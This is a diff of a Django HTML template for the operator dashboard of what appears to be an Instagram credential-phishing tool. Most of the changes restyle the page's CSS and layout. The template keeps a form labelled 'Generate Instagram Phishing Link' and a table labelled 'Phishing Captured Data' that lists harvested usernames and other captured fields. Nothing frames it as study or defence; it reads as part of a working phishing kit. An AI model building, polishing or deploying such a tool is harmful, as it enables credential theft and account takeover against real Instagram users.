@@ -2,8 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Dashboard </title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <title>User Home</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
@@ -11,74 +13,135 @@
       box-sizing: border-box;
       font-family: 'Poppins', sans-serif;
     }
+
     body {
+      background: #000;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background: #000;
-      padding: 40px;
+      align-items: flex-start;
+      padding: 40px 20px;
     }
+
     .wrapper {
       width: 100%;
       max-width: 900px;
       background: #000;
       box-shadow: 0 0 50px #0ef;
       border-radius: 20px;
-      padding: 40px;
-      overflow: auto;
+      padding: 30px;
+      animation: animate 5s linear infinite;
     }
-    .wrapper:hover {
-      animation: animate 1s linear infinite;
-    }
+
     @keyframes animate {
       100% {
         filter: hue-rotate(360deg);
       }
     }
+
     h1, h5, h6, p, label, th, td {
       color: #fff;
     }
-    .btn-warning {
-      background-color: #0ef;
+
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
       border: none;
-      color: #000;
+      border-radius: 30px;
+      cursor: pointer;
       font-weight: 600;
-      box-shadow: 0 0 10px #0ef;
+      transition: all 0.3s ease;
     }
-    .btn-warning:hover {
-      background-color: #00cfcf;
-    }
+
     .btn-danger {
+      background: red;
+      color: #fff;
       box-shadow: 0 0 10px red;
     }
-    input.form-control {
-      background: transparent;
-      border: 1px solid #0ef;
-      color: #fff;
-    }
-    input.form-control:focus {
-      background: transparent;
-      color: #fff;
-      box-shadow: 0 0 10px #0ef;
-    }
-    table {
-      color: #fff;
-      background: transparent;
-    }
-    .table thead {
+
+    .btn-warning {
       background: #0ef;
       color: #000;
+      box-shadow: 0 0 10px #0ef;
     }
-    .table-bordered td, .table-bordered th {
+
+    .btn-warning:hover {
+      background: #0cd;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      background: transparent;
       border: 1px solid #0ef;
+      color: #fff;
+      border-radius: 5px;
+      outline: none;
+    }
+
+    input[type="email"]::placeholder {
+      color: #aaa;
+    }
+
+    input[type="email"]:focus {
+      box-shadow: 0 0 10px #0ef;
+    }
+
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .col {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      color: #fff;
+    }
+
+    th, td {
+      border: 1px solid #0ef;
+      padding: 10px;
+      text-align: center;
+    }
+
+    thead {
+      background-color: #0ef;
+      color: #000;
+    }
+
+    @media (max-width: 768px) {
+      .wrapper {
+        padding: 20px;
+      }
+      h1 {
+        font-size: 24px;
+        text-align: center;
+      }
+      th, td {
+        font-size: 14px;
+        padding: 8px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .row {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
 <body>
 
 <div class="wrapper">
-  <h1 class="text-center mb-4">Dashboard</h1>
+  <h1 class="text-center">User Home</h1>
 
   {% if data %}
   {% for d in data %}
@@ -88,14 +151,16 @@
     <a href="../logout/" class="btn btn-danger mb-3">Logout</a>
 
     <hr>
-    <h6 class="mb-3">Generate Instagram Phishing Link</h6>
-    <form method="post" action="../generate_link/" class="row g-3">
+    <h6 class="mb-2">Generate Instagram Phishing Link</h6>
+    <form method="post" action="../generate_link/">
       {% csrf_token %}
-      <div class="col-md-8">
-        <input type="email" class="form-control" name="email" value="{{ d.email }}" required>
-      </div>
-      <div class="col-md-4">
-        <button type="submit" class="btn btn-warning w-100">Generate Link</button>
+      <div class="row">
+        <div class="col">
+          <input type="email" name="email" value="{{ d.email }}" placeholder="Enter email" required>
+        </div>
+        <div class="col">
+          <button type="submit" class="btn btn-warning w-100">Generate Link</button>
+        </div>
       </div>
     </form>
   </div>
@@ -103,7 +168,7 @@
   {% if data1 %}
   <div class="table-responsive">
     <h5 class="mb-3">Phishing Captured Data</h5>
-    <table class="table table-bordered text-center align-middle">
+    <table>
       <thead>
         <tr>
           <th>Username</th>
@@ -125,7 +190,6 @@
     </table>
   </div>
   {% endif %}
-
   {% endfor %}
   {% endif %}
 
